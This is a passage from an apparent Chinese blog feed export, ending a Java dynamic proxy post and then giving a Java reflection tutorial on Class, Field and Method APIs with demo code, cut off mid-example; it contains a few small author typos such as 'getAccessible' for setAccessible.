java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>(s1); <span class="comment">//由于是接口类型不能使用自定义方法setStudent()切换代理对象</span></span><br><span class="line">        <span class="type">Event</span> <span class="variable">proxyHello</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(s1.getClass().getClassLoader(), s1.getClass().getInterfaces(), handler);  <span class="comment">//设置代理对象</span></span><br><span class="line">        proxyHello.SubmitWork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">张三提交作业</span><br><span class="line">已收作业数量:1</span><br></pre></td></tr></table></figure><p>其中调用<code>Proxy.newProxyInstance()</code>时，JVM首先会根据传入的<code>interfaces</code>接口列表，动态生成一个<strong>新的类（代理类）</strong>，该类会实现<strong>所有指定的接口</strong>。然后使用传入<code>ClassLoader</code>类加载器加载生成的代理类字节码，将其定义为<strong>新的Java类</strong>，最后通过反射调用代理类的构造函数，传入调用处理器<code>handler</code>，创建代理对象。</p><p>当调用<code>proxyHello.SubmitWork();</code>触发invoke方法，object代理对象为<code>proxyHello</code>，args为<code>null</code>，即调用我们的<code>proxyHello.Submitwork()</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></p><p><a href="https://nivi4.notion.site/Java-b97e232be04941a7860206a0e908f2cd">https://nivi4.notion.site/Java-b97e232be04941a7860206a0e908f2cd</a></p><p><a href="https://liaoxuefeng.com/books/java/reflection/proxy/index.html">https://liaoxuefeng.com/books/java/reflection/proxy/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/archives/adc18de0/"/>
      <url>/archives/adc18de0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>java动态特性：一段代码，改变其中的变量，将会使这段代码产生功能性的变化。</p><p>Java反射机制是指在运行状态时，对于任意一个类，都能够获取这个类的所有属性和方法；对于一个对象，都能够调用它的任意一个方法和属性（包括私有方法和属性），这种动态获取信息以及动态调用对象方法的功能就称为Java的反射机制。</p><p>通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);          <span class="comment">// 动态加载类</span></span><br><span class="line">    clazz.getMethod(methodName)                      <span class="comment">// 获取方法对象</span></span><br><span class="line">         .invoke(clazz.newInstance());              <span class="comment">// 创建实例并调用方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/adc18de0/20210309150130.webp"></p><p>可以看到当我们创建一个类文件后，经过javac编译，就会形成<code>.class</code>文件，同时jvm内存会查找生成的<code>.class</code>文件读入内存和经过ClassLoader加载，同时会创建生成一个Class对象，里面拥有其获取的成员变量，成员方法和构造方法等。</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息。如果获取了某个Class实例，就可以通过这个Class实例获取到该实例对应的class的所有信息</p><ul><li><p>如果已经加载了某个类，就可以通过一个class的静态变量class获得。使用**.class来创建Class对象<strong>的引用时，</strong>不会自动初始化该Class对象**。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure><blockquote><p>未初始化该Class对象，不会触发静态代码块和静态变量赋值。</p></blockquote></li><li><p>如果<strong>上下文中存在某个类的实例，可以通过该实例变量提供的<code>getClass()</code>方法获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        String s=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">        Class cls=s.getClass();</span><br><span class="line">        </span><br><span class="line">        System.out.println(cls.getName());  <span class="comment">//获取类名，输出java.lang.String</span></span><br><span class="line">        System.out.println(cls.getSimpleName()); </span><br><span class="line"></span><br><span class="line">        System.out.println(cls == String.class);  <span class="comment">//检查Class对象是否表示String类，输出true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>此时获取的是已知实例的class对象，所以已初始化</p></blockquote></li><li><p>知道一个class的完整类名，可以通过静态方法<code>Class.forName()</code>获取。使用<code>forName()</code>会初始化该Class对象，即会<strong>触发静态代码块和静态变量赋值</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>foaName有两个函数重载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cls=Class.forName(String name)</span><br><span class="line">Class&lt;?&gt; cls=Class.forName(String name, **<span class="type">boolean</span>** initialize, ClassLoader loader)</span><br></pre></td></tr></table></figure><blockquote><p><code>Class&lt;?&gt;</code>表示某个未知类型的对象，泛型<code>&lt;?&gt;</code>是为了保证类型安全，避免强制类型转换的风险</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="literal">true</span>,currentLoader)</span><br></pre></td></tr></table></figure><blockquote><p>name指定加载的类名，initialize指定是否初始化，loader指定类加载器，若为null，默认使用系统类加载器</p></blockquote><p>第二个参数表示是否初始化，<strong>在forName的时候，构造函数并不会执行，而是执行类初始化。他会先执行<code>static&#123;&#125;</code>静态块里的内容：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyClass</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, LazyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LazyClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">LazyClass</span> <span class="variable">train</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LazyClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/adc18de0/QQ20250329-230043.png"></p><p>可以看到，当实例化这个类时，首先调用的是静态块<code>static&#123;&#125;</code>，其次是实例块<code>&#123;&#125;</code>，最后是构造函数。其中<code>static&#123;&#125;</code>就是在类初始化的时候调用的</p><blockquote><p>静态块是类加载时执行一次，实例块是每次实例化时执行，构造函数也是每次实例化时执行</p></blockquote><p>而由于Class实例在JVM中是唯一的，所以，上诉方法获取的Class实例是同一个实例</p><h2 id="Field类"><a href="#Field类" class="headerlink" title="Field类"></a>Field类</h2><h3 id="访问字段"><a href="#访问字段" class="headerlink" title="访问字段"></a>访问字段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field <span class="title function_">getField</span><span class="params">(name)</span>: 根据字段名获取某个<span class="keyword">public</span>的field(包括父类)</span><br><span class="line">Field <span class="title function_">getDeclaredField</span><span class="params">(name)</span>: 根据字段名获取当前类的某个field(不包括父类)</span><br><span class="line">Field[] getFielads(): 获取所有<span class="keyword">public</span>的field(包括父类)</span><br><span class="line">Field[] getDeclaredFields(): 获取当前类的所有field(不包括父类)</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class stdClass=Student.class;</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;score&quot;</span>));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> Person.age</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.score</span><br><span class="line"><span class="keyword">public</span> java.lang.String Person.name</span><br></pre></td></tr></table></figure><p>一个Field对象包含了一个字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称</li><li><code>getType()</code>：返回字段类型，也是一个Class实例</li><li><code>getModifiers()</code>：返回字段修饰符</li><li><code>get(obj)</code>：获取字段值</li><li>set：修改字段值</li></ul><h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>在Java反射机制中，主要通过<code>Field.get(Object obj)</code>来获取字段值，而字段值是存储在对象实例中的，因此我们要通过反射获取或修改某个字段值时，必须明确操作的具体对象实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Person std=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Class stdClass=std.getClass();</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade=<span class="number">90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stdClass.getField(“score”)用于获取字段对象，注意stdClass是一个对象而并非实例，所以需要创建一个实例</p></blockquote><p>但我们会发现，上面代码无法获取private字段，会抛出<code>IllegalAccessException</code>错误，这是因为没有访问权限</p><p>在访问私有字段前，我们可以<strong>通过设置<code>Field.setAccessible(true)</code>强制开启访问权限</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Person std=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Class stdClass=std.getClass();</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        Field f=stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(f.get(stdClass.newInstance()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade=<span class="number">90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">b1uel0n3</span></span><br><span class="line"><span class="comment">90</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">f.set(obj, <span class="string">&quot;xxxx&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>修改和读取的实例要相同，<code>stdClass.newInstance()</code> 每次调用都会创建一个新的 <code>Student</code> 实例。所以不要<code>f.set(f.get(stdClass.newInstance()),50);</code></p></blockquote><p>如果修改非<code>public</code>字段，需要先调用<code>setAccessible(true)</code>开启访问权限</p><h2 id="Method类"><a href="#Method类" class="headerlink" title="Method类"></a>Method类</h2><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(name,Class...)</span>: 获取某个<span class="keyword">public</span>的Method(包括父类)</span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(name,Class...)</span>: 获取当前类的某个Method(不包括父类)</span><br><span class="line">Method[] getMethods(): 获取所有<span class="keyword">public</span>的Method(包括父类)</span><br><span class="line">Method[] getDeclaredMethods(): 获取当前类的所有Method(不包括父类)</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Student.class;</span><br><span class="line">        System.out.println(cls.getMethod(<span class="string">&quot;getName&quot;</span>, String.class));</span><br><span class="line">        System.out.println(cls.getMethod(<span class="string">&quot;getScore&quot;</span>, String.class));</span><br><span class="line">        System.out.println(cls.getDeclaredMethod(<span class="string">&quot;getGrade&quot;</span>, <span class="type">int</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getScore</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGrade</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String m)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> java.lang.String Person.getName(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.getScore(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.getGrade(<span class="type">int</span>)</span><br></pre></td></tr></table></figure><p>一个Method对象包含一个方法的所有信息：</p><ul><li><code>getName()</code>: 返回方法名称</li><li><code>getReturnType()</code>: 返回方法返回值类型，也是一个Class实例</li><li><code>getParameterTypes()</code>: 返回方法的参数类型，是一个Class数组</li><li><code>getModifiers()</code>: 返回方法的修饰符</li></ul><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p><code>invoke</code>：调用方法</p><p><code>invoke</code>用于执行方法，它的第一个参数是：</p><ul><li><p><strong>如果这个方法是一个实例方法，那么第一个参数是实例对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Student.class.getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">method.invoke(student);</span><br></pre></td></tr></table></figure></li><li><p><strong>如果第一个方法是静态方法，那么第一个参数是类</strong></p></li></ul><p>这里用substring举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">substring</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        System.out.println(substring.invoke(name,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//el0n3</span></span><br></pre></td></tr></table></figure><h3 id="调用非public方法"><a href="#调用非public方法" class="headerlink" title="调用非public方法"></a>调用非public方法</h3><p>同样需要通过<code>getAccessible(true)</code>允许调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Student.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//输出hello b1uel0n3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello &quot;</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Person.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        m.invoke(<span class="keyword">new</span> <span class="title class_">Student</span>());  <span class="comment">//Student:hello</span></span><br><span class="line">    &#125;Student:hello</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span 